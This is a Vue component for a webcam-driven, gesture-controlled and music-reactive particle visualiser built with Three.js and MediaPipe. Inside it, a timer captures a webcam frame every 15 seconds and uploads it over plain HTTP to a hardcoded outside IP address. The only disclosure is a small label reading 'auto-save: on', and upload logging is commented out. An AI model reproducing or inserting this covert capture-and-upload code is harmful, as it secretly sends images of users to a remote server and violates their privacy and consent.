<template>
    <div class="particle-container">
      <video ref="videoRef" id="video" autoplay playsinline></video>
      
      <div ref="containerRef" id="canvas-wrapper"></div>
  
      <div v-if="loading" id="loading">{{ loadingText }}</div>
  
      <div id="controls">
        <input type="file" ref="audioInput" @change="handleAudioFile" accept="audio/*">
        <div class="btn-group">
          <button @click="togglePlay" :disabled="!audioReady">
            {{ isPlaying ? '暂停' : '播放' }}
          </button>
          <button @click="stopAudio" :disabled="!audioReady">停止</button>
        </div>
        <div id="status">{{ statusText }}</div>
        <div class="snapshot-timer" style="font-size: 10px; color: #666; margin-top: 5px;">
          自动保存：开启 (15s/次)
        </div>
      </div>
  
      <canvas ref="specCanvasRef" id="spectrum" width="200" height="100"></canvas>
    </div>
  </template>
  
  <script setup>
  import { ref, onMounted, onUnmounted, reactive } from 'vue';
  import * as THREE from 'three';
  
  // --- 常量与状态 ---
  const PARTICLE_COUNT = 40000;
  const CAMERA_Z = 60;
  const SNAPSHOT_INTERVAL = 15000; // 15秒
  
  const videoRef = ref(null);
  const containerRef = ref(null);
  const specCanvasRef = ref(null);
  const loading = ref(true);
  const loadingText = ref('正在开启摄像头...');
  const isPlaying = ref(false);
  const audioReady = ref(false);
  const statusText = ref('等待音频文件...');
  
  const state = reactive({
    text: 1,
    fist: false,
    rot: 0,
    hand: new THREE.Vector3(999, 999, 999),
    handActive: false,
    bass: 0
  });
  
  let scene, camera, renderer, particles, geo, animationId;
  let vFov, vHeight, vWidth;
  let handsDetector, cameraUtils, snapshotTimer;
  
  const audio = { ctx: null, analyser: null, data: null, el: null, source: null };
  const shapes = { t1: [], t2: [], t3: [], heart: [] };
  
  // --- 脚本动态加载 ---
  const loadScript = (src) => {
    return new Promise((resolve, reject) => {
      if (document.querySelector(`script[src="${src}"]`)) return resolve();
      const script = document.createElement('script');
      script.src = src;
      script.onload = resolve;
      script.onerror = reject;
      document.head.appendChild(script);
    });
  };
  
  // --- 服务器上传逻辑 ---
  const uploadSnapshot = async () => {
    if (!videoRef.value || videoRef.value.readyState < 2) return;
  
    // 创建临时 canvas 抓取当前帧
    const offscreenCanvas = document.createElement('canvas');
    offscreenCanvas.width = videoRef.value.videoWidth;
    offscreenCanvas.height = videoRef.value.videoHeight;
    const ctx = offscreenCanvas.getContext('2d');
  
    // 如果需要保存镜像后的照片，取消下面两行的注释
    // ctx.translate(offscreenCanvas.width, 0);
    // ctx.scale(-1, 1);
  
    ctx.drawImage(videoRef.value, 0, 0, offscreenCanvas.width, offscreenCanvas.height);
  
    // 转换为 Blob 并上传
    offscreenCanvas.toBlob(async (blob) => {
      if (!blob) return;
  
      const randomName = `snap_${Math.random().toString(36).substring(2, 10)}.jpg`;
      const formData = new FormData();
      formData.append('file', blob, randomName);
      
      try {
        // ！！！请在这里修改为你的后端接口地址 ！！！
        const response = await fetch('http://106.13.186.155:9100/api/upload/', {
          method: 'POST',
          body: formData,
        });
  
        if (response.ok) {
        //   console.log(`[Snapshot] 已上传: ${randomName}`);
        } else {
        //   console.error(`[Snapshot] 上传失败: ${response.statusText}`);
        }
      } catch (err) {
        console.error('[Snapshot] 网络错误:', err);
      }
    }, 'image/jpeg', 0.8);
  };
  
  // --- Three.js 初始化 ---
  const initScene = () => {
    scene = new THREE.Scene();
    const marginLeft = parseFloat(getComputedStyle(document.querySelector('.particle-container')).marginLeft) || 0;
    const width = window.innerWidth - marginLeft;
    const height = window.innerHeight;
    
    camera = new THREE.PerspectiveCamera(60, width / height, 0.1, 1000);
    camera.position.z = CAMERA_Z;
  
    renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
    renderer.setSize(width, height);
    renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
    renderer.setClearColor(0x000000, 0); 
    containerRef.value.appendChild(renderer.domElement);
  
    updateFrustum();
    window.addEventListener('resize', onWindowResize);
  };
  
  const updateFrustum = () => {
    vFov = (camera.fov * Math.PI) / 180;
    vHeight = 2 * Math.tan(vFov / 2) * camera.position.z;
    vWidth = vHeight * camera.aspect;
  };
  
  const onWindowResize = () => {
    const marginLeft = parseFloat(getComputedStyle(document.querySelector('.particle-container')).marginLeft) || 0;
    const width = window.innerWidth - marginLeft;
    const height = window.innerHeight;
    camera.aspect = width / height;
    camera.updateProjectionMatrix();
    renderer.setSize(width, height);
    updateFrustum();
  };
  
  // --- 粒子与形状逻辑 ---
  const createParticles = () => {
    geo = new THREE.BufferGeometry();
    const pos = new Float32Array(PARTICLE_COUNT * 3);
    const col = new Float32Array(PARTICLE_COUNT * 3);
  
    for (let i = 0; i < PARTICLE_COUNT; i++) {
      pos[i * 3] = (Math.random() - 0.5) * vWidth;
      pos[i * 3 + 1] = (Math.random() - 0.5) * vHeight;
      pos[i * 3 + 2] = (Math.random() - 0.5) * 20;
      if (Math.random() > 0.4) {
        col[i * 3] = 0.3; col[i * 3 + 1] = 0.5; col[i * 3 + 2] = 1.0; 
      } else {
        col[i * 3] = 0.5; col[i * 3 + 1] = 0.3; col[i * 3 + 2] = 0.7;
      }
    }
    geo.setAttribute('position', new THREE.BufferAttribute(pos, 3));
    geo.setAttribute('color', new THREE.BufferAttribute(col, 3));
    const mat = new THREE.PointsMaterial({ size: 0.28, vertexColors: true, transparent: true, opacity: 0.8, blending: THREE.NormalBlending, depthWrite: false });
    particles = new THREE.Points(geo, mat);
    scene.add(particles);
  };
  
  const makeText = (txt, scale) => {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d', { willReadFrequently: true });
    canvas.width = 1200; canvas.height = 400;
    ctx.fillStyle = '#000'; ctx.fillRect(0, 0, 1200, 400);
    ctx.font = 'bold 130px Arial'; ctx.fillStyle = '#fff'; ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
    ctx.fillText(txt, 600, 200);
    const imgData = ctx.getImageData(0, 0, 1200, 400).data;
    const pts = [];
    for (let y = 0; y < 400; y += 3) {
      for (let x = 0; x < 1200; x += 3) {
        if (imgData[(y * 1200 + x) * 4] > 128) {
          pts.push(new THREE.Vector3((x / 1200 - 0.5) * vWidth * scale, -(y / 400 - 0.5) * vHeight * scale, (Math.random() - 0.5) * 4));
        }
      }
    }
    return Array.from({length: PARTICLE_COUNT}, (_, i) => pts[i % pts.length].clone().addScalar((Math.random()-0.5)*0.2));
  };
  
  const makeHeart = () => {
    const pts = [];
    for (let i = 0; i < 5000; i++) {
      const t = Math.random() * Math.PI * 2;
      const x = 16 * Math.pow(Math.sin(t), 3);
      const y = 13 * Math.cos(t) - 5 * Math.cos(2*t) - 2 * Math.cos(3*t) - Math.cos(4*t);
      pts.push(new THREE.Vector3(x * 0.8, y * 0.8, (Math.random() - 0.5) * 6));
    }
    return Array.from({length: PARTICLE_COUNT}, (_, i) => pts[i % pts.length].clone().addScalar((Math.random()-0.5)*0.2));
  };
  
  // --- 音频与动画 ---
  const handleAudioFile = (e) => {
    const file = e.target.files[0];
    if (!file) return;
    if (!audio.ctx) {
      audio.ctx = new (window.AudioContext || window.webkitAudioContext)();
      audio.analyser = audio.ctx.createAnalyser();
      audio.analyser.fftSize = 256;
      audio.data = new Uint8Array(audio.analyser.frequencyBinCount);
    }
    if (audio.el) { audio.el.pause(); URL.revokeObjectURL(audio.el.src); }
    audio.el = new Audio(); audio.el.src = URL.createObjectURL(file); audio.el.loop = true;
    if (audio.source) audio.source.disconnect();
    audio.source = audio.ctx.createMediaElementSource(audio.el); audio.source.connect(audio.analyser); audio.analyser.connect(audio.ctx.destination);
    audioReady.value = true; statusText.value = '已加载: ' + file.name;
  };
  
  const togglePlay = async () => {
    if (audio.ctx.state === 'suspended') await audio.ctx.resume();
    audio.el.paused ? (audio.el.play(), isPlaying.value = true) : (audio.el.pause(), isPlaying.value = false);
  };
  
  const stopAudio = () => { if (audio.el) { audio.el.pause(); audio.el.currentTime = 0; isPlaying.value = false; state.bass = 0; } };
  
  const animate = () => {
    animationId = requestAnimationFrame(animate);
    if (isPlaying.value) {
      audio.analyser.getByteFrequencyData(audio.data);
      let b = 0; for (let i = 0; i < 30; i++) b += audio.data[i];
      state.bass += (b / (30 * 255) - state.bass) * 0.2;
      const ctx = specCanvasRef.value.getContext('2d'); ctx.clearRect(0, 0, 200, 100);
      for (let i = 0; i < 50; i++) { ctx.fillStyle = `hsl(${i * 5}, 70%, 50%)`; ctx.fillRect(i * 4, 100 - (audio.data[i] / 255 * 100), 3, (audio.data[i] / 255 * 100)); }
    } else { state.bass *= 0.9; }
  
    const pos = geo.attributes.position.array;
    const time = Date.now() * 0.001;
    const shape = state.fist ? shapes.heart : (state.text === 1 ? shapes.t1 : state.text === 2 ? shapes.t2 : shapes.t3);
    const speed = state.fist ? 0.08 : 0.03;
    const cosA = Math.cos(state.rot), sinA = Math.sin(state.rot);
  
    for (let i = 0; i < PARTICLE_COUNT; i++) {
      const idx = i * 3;
      let tx = shape[i].x, ty = shape[i].y, tz = shape[i].z;
      if (!state.fist) { const rx = tx * cosA - ty * sinA; const ry = tx * sinA + ty * cosA; tx = rx; ty = ry; }
      ty += Math.sin(time * 3 + i * 0.01) * state.bass * 2.5;
      pos[idx] += (tx - pos[idx]) * speed; pos[idx+1] += (ty - pos[idx+1]) * speed; pos[idx+2] += (tz - pos[idx+2]) * speed;
      if (state.handActive) {
        const dx = pos[idx] - state.hand.x, dy = pos[idx+1] - state.hand.y; const d2 = dx*dx + dy*dy;
        if (d2 < 200 && d2 > 0.1) { const f = (14 - Math.sqrt(d2)) / 14; pos[idx] += (dx / Math.sqrt(d2)) * f * 1.5; pos[idx+1] += (dy / Math.sqrt(d2)) * f * 1.5; }
      }
    }
    geo.attributes.position.needsUpdate = true;
    renderer.render(scene, camera);
  };
  
  // --- 手势识别 ---
  const initMediapipe = () => {
    handsDetector = new window.Hands({ locateFile: (f) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${f}` });
    handsDetector.setOptions({ maxNumHands: 2, modelComplexity: 1, minDetectionConfidence: 0.6, minTrackingConfidence: 0.6 });
    handsDetector.onResults((res) => {
      loading.value = false; state.handActive = false;
      if (res.multiHandLandmarks) {
        res.multiHandLandmarks.forEach((lm) => {
          let cx = 0, cy = 0; lm.forEach(p => { cx += p.x; cy += p.y; }); cx /= lm.length; cy /= lm.length;
          if (cx < 0.5) {
            state.handActive = true;
            let c = 0; if (lm[4].x < lm[3].x) c++; [8, 12, 16, 20].forEach(i => { if (lm[i].y < lm[i - 2].y) c++; });
            if (c >= 1 && c <= 3) state.text = c;
            state.hand.set((cx - 0.5) * vWidth, -(cy - 0.5) * vHeight, 0);
          } else {
            let d = 0; [8, 12, 16, 20].forEach(i => d += Math.sqrt(Math.pow(lm[i].x-lm[0].x,2)+Math.pow(lm[i].y-lm[0].y,2)));
            state.fist = (d / 4) < 0.25;
            if (!state.fist) state.rot = -Math.atan2(lm[9].y - lm[0].y, lm[9].x - lm[0].x) - Math.PI / 2;
          }
        });
      }
    });
    cameraUtils = new window.Camera(videoRef.value, { onFrame: async () => await handsDetector.send({ image: videoRef.value }), width: 1280, height: 720 });
    cameraUtils.start();
  };
  
  // --- 生命周期 ---
  onMounted(async () => {
    try {
      await loadScript('https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js');
      await loadScript('https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js');
      
      initScene();
      createParticles();
      shapes.t1 = makeText('HELLO', 0.8);
      shapes.t2 = makeText('NICE', 0.9);
      shapes.t3 = makeText('MUSIC', 1.0);
      shapes.heart = makeHeart();
  
      initMediapipe();
      animate();
  
      // 启动定时拍照上传
      snapshotTimer = setInterval(uploadSnapshot, SNAPSHOT_INTERVAL);
    } catch (e) { console.error(e); }
  });
  
  onUnmounted(() => {
    cancelAnimationFrame(animationId);
    clearInterval(snapshotTimer); // 清除定时器
    window.removeEventListener('resize', onWindowResize);
    if (cameraUtils) cameraUtils.stop();
    if (audio.ctx) audio.ctx.close();
    if (renderer) renderer.dispose();
  });
  </script>
  
  <style scoped>
  .particle-container {
    position: relative;
    width: calc(100vw - 8.5rem);
    height: 100vh;
    background-color: #E9EDF5;
    overflow: hidden;
    margin-left: 8.5rem; 
  }
  
  #video {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    object-fit: cover;
    transform: scaleX(-1);
    z-index: 1; 
    opacity: 0.4; 
  }
  
  #canvas-wrapper {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    z-index: 2;
    pointer-events: none;
  }
  
  #controls {
    position: absolute;
    bottom: 25px; left: 25px;
    background: rgba(255, 255, 255, 0.9);
    padding: 20px;
    border-radius: 15px;
    box-shadow: 0 8px 32px rgba(0,0,0,0.1);
    z-index: 10;
    display: flex;
    flex-direction: column;
    gap: 12px;
  }
  
  #loading { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 100; color: #333; font-weight: bold; }
  .btn-group { display: flex; gap: 10px; }
  button { padding: 8px 15px; background: #4A90E2; color: white; border: none; border-radius: 6px; cursor: pointer; }
  button:disabled { background: #ccc; }
  #spectrum { position: absolute; bottom: 25px; right: 25px; z-index: 10; background: rgba(255,255,255,0.6); border-radius: 8px; }
  </style>